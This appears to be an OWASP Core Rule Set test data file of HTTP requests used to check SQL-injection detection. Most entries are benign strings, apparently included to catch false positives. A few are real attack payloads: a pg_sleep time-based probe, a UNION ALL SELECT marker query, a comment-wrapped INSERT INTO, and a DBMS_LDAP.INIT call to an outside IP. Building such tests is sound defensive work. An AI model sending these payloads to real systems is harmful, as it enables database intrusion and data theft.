+SQL	GET	/mail/	_task=mail&_caps=pdf%3D1%2Cflash%3D0%2Ctiff%3D0%2Cwebp%3D1%2Cpgpmime%3D0&_uid=22544&_mbox=INBOX&_framed=1&_action=preview	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+SQL	GET	/wp-json/wp/v2/pages	context=edit&per_page=100&_fields=id%2Clink%2Cmenu_order%2Cparent%2Ctitle%2Ctype&orderby=menu_order&order=asc&_locale=user	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		test=ABANCA%20CORPORACION%20BANCARIA,%20S.A	User-Agent: OWASP CRS test agent
+SQL	GET	/		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: https://www.test.fr/327-peintures-interieur?categories=peintures-de-decorations,peintures-de-finitions&page=2
+SQL	GET	/		OWASP CRS test agent			User-Agent: OWASP CRS test agent Referer: https://www.test.fr/?filter_product_brand=5432,5646,5380
+SQL	GET	/		Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/22H352 Safari/604.1 [FBAN/FBIOS;FBAV/564.0.0.57.71;FBBV/985438427;FBDV/iPhone11,2;FBMD/iPhone;FBSN/iOS;FBSV/18.7.8;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/990999493;IABMV/1];FBNV/1			User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 18_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/22H352 Safari/604.1 [FBAN/FBIOS;FBAV/564.0.0.57.71;FBBV/985438427;FBDV/iPhone11,2;FBMD/iPhone;FBSN/iOS;FBSV/18.7.8;FBSS/3;FBID/phone;FBLC/fr_FR;FBOP/5;FBRV/990999493;IABMV/1];FBNV/1
+SQL	GET	/		Microsoft Office Outlook/16.100.824 (Mac OS/15.6.1; Desktop; fr-FR; NonAppStore; Apple/Mac16,7)			User-Agent: Microsoft Office Outlook/16.100.824 (Mac OS/15.6.1; Desktop; fr-FR; NonAppStore; Apple/Mac16,7)
+SQL	POST	/post		OWASP CRS test agent		text=And%2C+of+course%2C+I+was+kidding.%22	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		text=Alta+Arsenault+says+she+knits+%27morning+to+night%2C+every+day.%27	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		pay%3D%3Bset+%40	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		pay%3D1+OR+2%2B	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		pay%3D%2FBusiness+and	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		pay%3D4AND4%2B	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		pay%3D%2Fxxxx_R+or	User-Agent: OWASP CRS test agent
+SQL	GET	/get	var=I%20like%20you%21	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+SQL	GET	/get	var=having%20pain%21	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+SQL	GET	/get	var=behaving%20badly%2F	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+SQL	GET	/get	var=o.havingu%40gmail.com	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+SQL	GET	/get	var=Just%20in%20case%20%28abc%29	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+SQL	GET	/get	var=having%20fun	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+SQL	GET	/get		OWASP CRS test agent	$existingUser=admin		User-Agent: OWASP CRS test agent Cookie: $existingUser=admin
+SQL	POST	/post		OWASP CRS test agent		{"$existsor": "foo"}	User-Agent: OWASP CRS test agent Content-Type: application/json
+SQL	POST	/post		OWASP CRS test agent		var=booked%20for%202021%28including%202020	User-Agent: OWASP CRS test agent
+SQL	GET	/get	var=%22%27%20and%20%3d%20bar	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		"var=05111222333 andy.surname@somedomain.com" 	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		var=05111222333 andy.surname@somedomain.com	User-Agent: OWASP CRS test agent
+SQL	GET	/get	var=except%20selecting	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		email='ortrue	User-Agent: OWASP CRS test agent
+SQL	GET	/get	var=%3Binsertion_424242	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+SQL	GET	/get	test=%2F%2A%27%3BINSERT%20INTO%20category%28id%29%20VALUES%20%283%29--%20-%2A%2F	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		, aside from	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		a=/create	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		 Delete (Trashcan)	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		5desc	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		34-delete	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		 update	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		/select-quote	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		 Update: After...	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		"desc"	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		a=/load.php	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		a=/update-assets	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		bla blabla live update chart	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		.select-gws-banana	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		blablabla. As evidence from the following blablabla	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		||(SELECT(DBMS_LDAP.INIT('169.1.1.1',19))FROM(DUAL))/investigate	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		'||(select(pg_sleep(15))where(true))||'/investigate	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		UNION ALL SELECT NULL,NULL,CONCAT(CONCAT('qqkjq','mxTSrPILRz'),'qvxvq')-- sqCV	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		, aside from	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		a=/create	User-Agent: OWASP CRS test agent
+SQL	GET	/code	snippet=for%20loop%20in%20javascript	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+SQL	GET	/settings	format=json	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+SQL	GET	/compare	value=123%3C456	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+SQL	GET	/search	q=famous%20actor	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		and 7 oranges	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent	test=!@#$%^&		Cookie: test=!@#$%^& User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent	pref=你好世界		Cookie: pref=你好世界 User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent	pref=こんにちは		Cookie: pref=こんにちは User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent	session=a1b2c3d4e5f6g7h8i9j0		Cookie: session=a1b2c3d4e5f6g7h8i9j0 User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent	token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9		Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 User-Agent: OWASP CRS test agent
+SQL	GET	/get		OWASP CRS test agent	test=!@		Cookie: test=!@ User-Agent: OWASP CRS test agent
+SQL	GET	/get		OWASP CRS test agent	pref=你好		Cookie: pref=你好 User-Agent: OWASP CRS test agent
+SQL	GET	/get		OWASP CRS test agent	pref=こんにちは		Cookie: pref=こんにちは User-Agent: OWASP CRS test agent
+SQL	GET	/get		OWASP CRS test agent	session=abc123def456		Cookie: session=abc123def456 User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		var=%21%40%23%24%25%5e%26%2a%28%29%2d	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		comment=%e4%bd%a0%e5%a5%bd%e4%b8%96%e7%95%8c%e8%bf%99%e6%98%af%e4%b8%80%e6%ae%b5%e4%b8%ad%e6%96%87%e6%96%87%e6%9c%ac	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		comment=%e3%81%93%e3%82%93%e3%81%ab%e3%81%a1%e3%81%af%e4%b8%96%e7%95%8c%e3%81%93%e3%82%8c%e3%81%af%e6%97%a5%e6%9c%ac%e8%aa%9e%e3%81%ae%e3%83%86%e3%82%ad%e3%82%b9%e3%83%88%e3%81%a7%e3%81%99	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		comment=%d8%a7%d9%84%d8%b3%d9%84%d8%a7%d9%85%20%d8%b9%d9%84%d9%8a%d9%83%d9%85%20%d9%87%d8%b0%d8%a7%20%d9%86%d8%b5%20%d8%b9%d8%b1%d8%a8%d9%8a	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		comment=%d7%a9%d7%9c%d7%95%d7%9d%20%d7%a2%d7%95%d7%9c%d7%9d%20%d7%96%d7%94%20%d7%98%d7%a7%d7%a1%d7%98%20%d7%91%d7%a2%d7%91%d7%a8%d7%99%d7%aa	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		comment=%ec%95%88%eb%85%95%ed%95%98%ec%84%b8%ec%9a%94%20%ec%84%b8%ea%b3%84%20%ec%9d%b4%ea%b2%83%ec%9d%80%20%ed%95%9c%ea%b5%ad%ec%96%b4%20%ed%85%8d%ec%8a%a4%ed%8a%b8%ec%9e%85%eb%8b%88%eb%8b%a4	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		token=SGVsbG9Xb3JsZFRoaXNJc0FCYXNlNjRFbmNvZGVkU3RyaW5n	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		hash=e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		comment=Hello%2c%20world%21%20This%20is%20a%20test.	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		order%5bfilters%5d%5bdate_add%5d%5bfrom%5d=1	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		order%5badd-to-cart%5d%5b%5d=1	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		var=%21%40%23%24%25	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		comment=%e4%bd%a0%e5%a5%bd%e4%b8%96%e7%95%8c	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		comment=%e3%81%93%e3%82%93%e3%81%ab%e3%81%a1%e3%81%af	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		var=%21	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		comment=%e4%bd%a0%e5%a5%bd	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		comment=%e3%81%93%e3%82%93	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		comment=Hello%2c%20world	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMe--KKF2QT4fwpMeJf36POk6yJV_adQssw-5c	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent	token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMe--KKF2QT4fwpMeJf36POk6yJV_adQssw-5c	foo=bar	User-Agent: OWASP CRS test agent Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMe--KKF2QT4fwpMeJf36POk6yJV_adQssw-5c
+SQL	GET	/get/callback	token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMe--KKF2QT4fwpMeJf36POk6yJV_adQssw-5c	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+SQL	GET	/get	fbclid=IwAR1dug0BYxe0ukhZ2vKrdQwLAxVFRJ--Q2Y7OBJE_0uId9-Eh-sJWLdVk2E	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+SQL	GET	/get	gclid=j0KCQiA1NebBhDDARIsAANiDD3_RJeMv8zScF--mC1jf8fO8PDYJCxD9xdwT7iQ59QIIwL-86ncQtMaAh0lEALw_wcB	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+SQL	POST	/get		OWASP CRS test agent		recaptchaToken=0cAFcWeA5Q9qneoy5svp-ow9uyksp1u8sdCA2it1v80Rwl-bn0dpYRQ1btnvXVw5Im6Y_3pmpZe8MZrDhXYmHL0BejWDB3sFBRF1NG1FOR0jCDb3KMsIMwqZl-0x0LSotoGHaltCfASwYfm5lYf5g8tZA_IciJIesdbPZ3d8lxKAyRM-NQjCPBmyQAakve6wo0I52vKBUpju4ngxfbItIHoGE5pfBfncWTPsIMdHaXCzUs-SN298tv2LoHGb_cV1Xy91VmyiW79yRu-x3e176VYsQ404bMwv4mIf9ATJV_QI-ygbxIMHQ62hNNaZp8pVAX2TKRx5jqEyc2iNZGUlwPYKnHZn2AjSoKFNbxxCNAbdu_QV3aPN8RbudCLvXOwGRcX0mULEte8OMzkB8B8Ih5HT1AiOhLMAah2CM6533LHEDQRsK-8ykmZUN4m3qM9tcQBd7ZFQAy--_SV4qUOWZC8laMtDCIj4cnpZ8FF1RIizocdrE7YhOoSeB8XEYnr0A3WP-vpJ58Cdy5OtypswnizLTXUf1gMsgYfTr4PBc0rBq8_E54qinjHNxe1Y_MiMqXegVMsGS_llQjUws8NITFEetlBK0JuK9WH-0kuimcd4EF1ChzMRJV5Ps22QfAT5qIqPQGlVycL3FXrDZMWT1igkbU2hnLwJl6MD1SoZfeOSxt5nq6WxL2qYtWJd8w-dXQ3hQ5iz0WBldlntF2jOo13n6rraaD4h7JuDdqyBD_zr_WZ84n5CVf5myNcdaOu4r4tj5IHp4GBfXe5jIomtyuSqlPh_-9o9VWFW-9ReL5LrwArMAsHodADbfhu9AviIYIGCRAE2OnTGlbgREWDS8IWAuoeasA1ZmlVv6O3gzEl7W7tUlCmceMIjlyrUaPAGHSUgYJWQoIM1pW8lgmbZtaugbkA3DcfL5hW-AmTZg53-o0BQ	User-Agent: OWASP CRS test agent
+SQL	POST	/get		OWASP CRS test agent		g-recaptcha-response=0cAFcWeA5Q9qneoy5svp-ow9uyksp1u8sdCA2it1v80Rwl-bn0dpYRQ1btnvXVw5Im6Y_3pmpZe8MZrDhXYmHL0BejWDB3sFBRF1NG1FOR0jCDb3KMsIMwqZl-0x0LSotoGHaltCfASwYfm5lYf5g8tZA_IciJIesdbPZ3d8lxKAyRM-NQjCPBmyQAakve6wo0I52vKBUpju4ngxfbItIHoGE5pfBfncWTPsIMdHaXCzUs-SN298tv2LoHGb_cV1Xy91VmyiW79yRu-x3e176VYsQ404bMwv4mIf9ATJV_QI-ygbxIMHQ62hNNaZp8pVAX2TKRx5jqEyc2iNZGUlwPYKnHZn2AjSoKFNbxxCNAbdu_QV3aPN8RbudCLvXOwGRcX0mULEte8OMzkB8B8Ih5HT1AiOhLMAah2CM6533LHEDQRsK-8ykmZUN4m3qM9tcQBd7ZFQAy--_SV4qUOWZC8laMtDCIj4cnpZ8FF1RIizocdrE7YhOoSeB8XEYnr0A3WP-vpJ58Cdy5OtypswnizLTXUf1gMsgYfTr4PBc0rBq8_E54qinjHNxe1Y_MiMqXegVMsGS_llQjUws8NITFEetlBK0JuK9WH-0kuimcd4EF1ChzMRJV5Ps22QfAT5qIqPQGlVycL3FXrDZMWT1igkbU2hnLwJl6MD1SoZfeOSxt5nq6WxL2qYtWJd8w-dXQ3hQ5iz0WBldlntF2jOo13n6rraaD4h7JuDdqyBD_zr_WZ84n5CVf5myNcdaOu4r4tj5IHp4GBfXe5jIomtyuSqlPh_-9o9VWFW-9ReL5LrwArMAsHodADbfhu9AviIYIGCRAE2OnTGlbgREWDS8IWAuoeasA1ZmlVv6O3gzEl7W7tUlCmceMIjlyrUaPAGHSUgYJWQoIM1pW8lgmbZtaugbkA3DcfL5hW-AmTZg53-o0BQ	User-Agent: OWASP CRS test agent
+SQL	POST	/get		OWASP CRS test agent		recaptcha-v3-token=0cAFcWeA5Q9qneoy5svp-ow9uyksp1u8sdCA2it1v80Rwl-bn0dpYRQ1btnvXVw5Im6Y_3pmpZe8MZrDhXYmHL0BejWDB3sFBRF1NG1FOR0jCDb3KMsIMwqZl-0x0LSotoGHaltCfASwYfm5lYf5g8tZA_IciJIesdbPZ3d8lxKAyRM-NQjCPBmyQAakve6wo0I52vKBUpju4ngxfbItIHoGE5pfBfncWTPsIMdHaXCzUs-SN298tv2LoHGb_cV1Xy91VmyiW79yRu-x3e176VYsQ404bMwv4mIf9ATJV_QI-ygbxIMHQ62hNNaZp8pVAX2TKRx5jqEyc2iNZGUlwPYKnHZn2AjSoKFNbxxCNAbdu_QV3aPN8RbudCLvXOwGRcX0mULEte8OMzkB8B8Ih5HT1AiOhLMAah2CM6533LHEDQRsK-8ykmZUN4m3qM9tcQBd7ZFQAy--_SV4qUOWZC8laMtDCIj4cnpZ8FF1RIizocdrE7YhOoSeB8XEYnr0A3WP-vpJ58Cdy5OtypswnizLTXUf1gMsgYfTr4PBc0rBq8_E54qinjHNxe1Y_MiMqXegVMsGS_llQjUws8NITFEetlBK0JuK9WH-0kuimcd4EF1ChzMRJV5Ps22QfAT5qIqPQGlVycL3FXrDZMWT1igkbU2hnLwJl6MD1SoZfeOSxt5nq6WxL2qYtWJd8w-dXQ3hQ5iz0WBldlntF2jOo13n6rraaD4h7JuDdqyBD_zr_WZ84n5CVf5myNcdaOu4r4tj5IHp4GBfXe5jIomtyuSqlPh_-9o9VWFW-9ReL5LrwArMAsHodADbfhu9AviIYIGCRAE2OnTGlbgREWDS8IWAuoeasA1ZmlVv6O3gzEl7W7tUlCmceMIjlyrUaPAGHSUgYJWQoIM1pW8lgmbZtaugbkA3DcfL5hW-AmTZg53-o0BQ	User-Agent: OWASP CRS test agent
+SQL	GET	/get	brid=DLZJ9w0c--9DeBML6-QCPI_2g	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+SQL	GET	/get	url_slug=my--slugified-url	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		var=IHRlc3Q0xAcF	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		var=9F86D081884C7D659A2FEAA0C55AD015A3BF4F1B2B0B822CD15D6C15B0F00A08	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		var=foo...	User-Agent: OWASP CRS test agent
+SQL	GET	/get	'bla'	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+SQL	GET	/get	`bla`	OWASP CRS test agent			User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		var=id'is%20notes	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		var=x'%40email--	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		var=x'~email--	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		var=bob's%20or%20alice's	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		var=mother%20or%20daughter	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		var='oreo	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		var='fork	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		var='%20for	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		var=''or	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		var=''or	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		var=''or	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		var=%5C'lol'%20or%20'1	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		var=Incorrectly%20constructed%20SQL%20statements%0AThis%20form%20of%20injection%20relies%20on%20the%20fact%20that%20SQL%20statements%20consist%20of%20both%20data%20used%20by%20the%20SQL%20statement%20and%20commands%20that%20control%20how%20the%20SQL%20statement%20is%20executed.%20For%20example%2C%20in%20the%20SQL%20statement%20select%20*%20from%20person%20where%20name%20%3D%20'susan'%20and%20age%20%3D%202%20the%20string%20'susan'%20is%20data%20and%20the%20fragment%20and%20age%20%3D%202%20is%20an%20example%20of%20a%20command%20(the%20value%202%20is%20also%20data%20in%20this%20example).%0A%0ASQL%20injection%20occurs%20when%20specially%20crafted%20user%20input%20is%20processed%20by%20the%20receiving%20program%20in%20a%20way%20that%20allows%20the%20input%20to%20exit%20a%20data%20context%20and%20enter%20a%20command%20context.%20This%20allows%20the%20attacker%20to%20alter%20the%20structure%20of%20the%20SQL%20statement%20which%20is%20executed.%0A%0AAs%20a%20simple%20example%2C%20imagine%20that%20the%20data%20'susan'%20in%20the%20above%20statement%20was%20provided%20by%20user%20input.%20The%20user%20entered%20the%20string%20'susan'%20(without%20the%20apostrophes)%20in%20a%20web%20form%20text%20entry%20field%2C%20and%20the%20program%20used%20string%20concatenation%20statements%20to%20form%20the%20above%20SQL%20statement%20from%20the%20three%20fragments%20select%20*%20from%20person%20where%20name%3D'%2C%20the%20user%20input%20of%20'susan'%2C%20and%20'%20and%20age%20%3D%202.%0A%0ANow%20imagine%20that%20instead%20of%20entering%20'susan'%20the%20attacker%20entered%20'%20or%201%3D1%3B%20--.%0A%0AThe%20program%20will%20use%20the%20same%20string%20concatenation%20approach%20with%20the%203%20fragments%20of%20select%20*%20from%20person%20where%20name%3D'%2C%20the%20user%20input%20of%20'%20or%201%3D1%3B%20--%2C%20and%20'%20and%20age%20%3D%202%20and%20construct%20the%20statement%20select%20*%20from%20person%20where%20name%3D''%20or%201%3D1%3B%20--%20and%20age%20%3D%202.%20Many%20databases%20will%20ignore%20the%20text%20after%20the%20'--'%20string%20as%20this%20denotes%20a%20comment.%20The%20structure%20of%20the%20SQL%20command%20is%20now%20select%20*%20from%20person%20where%20name%3D''%20or%201%3D1%3B%20and%20this%20will%20select%20all%20person%20rows%20rather%20than%20just%20those%20named%20'susan'%20whose%20age%20is%202.%20The%20attacker%20has%20managed%20to%20craft%20a%20data%20string%20which%20exits%20the%20data%20context%20and%20entered%20a%20command%20context.%0A%0AA%20more%20complex%20example%20is%20now%20presented.%0A%0AImagine%20a%20program%20creates%20a%20SQL%20statement%20using%20the%20following%20string%20assignment%20command%20%3A%0A%0Avar%20statement%20%3D%20%22SELECT%20*%20FROM%20users%20WHERE%20name%20%3D%20'%22%20%2B%20userName%20%2B%20%22'%22%3B%0A%0AThis%20SQL%20code%20is%20designed%20to%20pull%20up%20the%20records%20of%20the%20specified%20username%20from%20its%20table%20of%20users.%20However%2C%20if%20the%20%22userName%22%20variable%20is%20crafted%20in%20a%20specific%20way%20by%20a%20malicious%20user%2C%20the%20SQL%20statement%20may%20do%20more%20than%20the%20code%20author%20intended.%20For%20example%2C%20setting%20the%20%22userName%22%20variable%20as%3A%0A%0A'%20OR%20'1'%3D'1%0Aor%20using%20comments%20to%20even%20block%20the%20rest%20of%20the%20query%20(there%20are%20three%20types%20of%20SQL%20comments%5B14%5D).%20All%20three%20lines%20have%20a%20space%20at%20the%20end%3A%0A%0A'%20OR%20'1'%3D'1'%20--%0A'%20OR%20'1'%3D'1'%20%7B%0A'%20OR%20'1'%3D'1'%20%2F*%20	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		var=.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'.'or	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		var='or'1	User-Agent: OWASP CRS test agent
+SQL	POST	/post		OWASP CRS test agent		var=%5C' foo or	User-Agent: OWASP CRS test agent
